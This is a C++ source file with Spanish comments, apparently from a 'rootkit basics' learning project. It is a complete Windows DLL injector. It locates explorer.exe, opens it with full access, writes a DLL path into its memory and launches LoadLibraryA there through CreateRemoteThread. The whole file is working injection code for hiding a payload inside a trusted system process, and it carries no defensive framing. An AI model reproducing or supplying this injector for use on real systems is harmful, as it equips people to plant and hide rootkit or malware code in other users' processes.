/*
* FehuC++.cpp : Este archivo contiene la función "main".
* La ejecución del programa comienza y termina ahí.
*/

#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <comdef.h>
#include "FehuC++.h"

using namespace std;

int NOT_EXIST = -1;
HANDLE process;
LPVOID remoteString;
LPVOID loadLibrary = NULL;
int CURRENT_PROCESS_ID = 0;
HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, CURRENT_PROCESS_ID);
PROCESSENTRY32 processInfo;
std::string targetProcessName = "explorer.exe";
std::int32_t targetProcessPID = -1;
boolean ERROR_404 = false;
const char* pathDLL = "C:\\Users\\eyver\\Documents\\gitHub_R\\rootkit_basics\\Release\\FehuDLL.dll";
//const char* pathDLL = "C:\\Users\\eyver\\Documents\\gitHub_R\\rootkit_basics\\Debug\\FehuDLL.dll";
typedef bool (*testFunction)();
testFunction dllFunction;

int loadDLL() {
    cout << "Loading DLL ..." << "\n";

    process = OpenProcess(PROCESS_ALL_ACCESS,false,targetProcessPID);
    HMODULE paramA = GetModuleHandle(L"kernel32.dll");

    if (paramA != 0) {
        const char* paramB = "LoadLibraryA";
        LPVOID paramC = GetProcAddress(paramA, paramB);
        loadLibrary = paramC;
        cout << "loadLibrary ..." << "\n";
    } else {
        cout << "ERROR_LOAD_DLL" << "\n";
        return 0;
    }

    remoteString = VirtualAllocEx(process,NULL,strlen(pathDLL),MEM_COMMIT | MEM_RESERVE,PAGE_READWRITE);
    cout << "find : " << pathDLL << "\n";

    if (remoteString != 0) {
        WriteProcessMemory(process,remoteString,pathDLL,strlen(pathDLL),NULL);
        cout << "WriteProcessMemory ..." << "\n";
    } else {
        cout << "ERROR_LOAD_DLL" << "\n";
        return 0;
    }
    

    LPTHREAD_START_ROUTINE tmp = (LPTHREAD_START_ROUTINE)loadLibrary;
    CreateRemoteThread(process,NULL,NULL,tmp,remoteString,NULL,NULL);
    CloseHandle(process);
    HINSTANCE hDll = LoadLibraryA(pathDLL);
    bool bandera = false;
    string response = "";

    if (hDll) {
        dllFunction = (testFunction)GetProcAddress(hDll, "example");
        bandera = dllFunction();
        if (bandera == 1) {
            response = "DLL >> true :D";
        } else {
            response = "DLL >> false D:";
        }
    }

    cout << response << "\n";
    return 0;
}

int findProcess() {
    boolean flag = true;
    while (Process32Next(handle, &processInfo) && flag) {
        std::wstring ws(processInfo.szExeFile);
        std::string str(ws.begin(), ws.end());
        if (str == targetProcessName) {
            targetProcessPID = processInfo.th32ProcessID;
            flag = false;
        }
    }

    CloseHandle(handle);
    if (targetProcessPID == NOT_EXIST) {
        return -1;
    }
    return targetProcessPID;
}

boolean badResources() {
    if (handle == 0 || handle == INVALID_HANDLE_VALUE) {
        std::cout << "ERROR_SNAPPROCESS" << "\n";
        CloseHandle(handle);
        return true;
    }

    processInfo.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(handle, &processInfo)) {
        std::cout << "ERROR_FIRST_PROCESS" << "\n";
        CloseHandle(handle);
        return true;
    }

    return false;
}

int main() {
    if (badResources())
        return 0;

    targetProcessPID = findProcess();
    if (targetProcessPID == NOT_EXIST) {
        cout << "PID ::" << "NOT_EXIST" << "\n";
        return 0;
    } else {
        cout << "PID ::" << targetProcessPID << "\n";
        loadDLL();
        cout << "DLL load succesfully !!" << "\n";
        return 0;
    }
}

/*
* Ejecutar programa: Ctrl + F5 > Iniciar sin depurar
* Depurar programa: F5 > Iniciar depuración
*/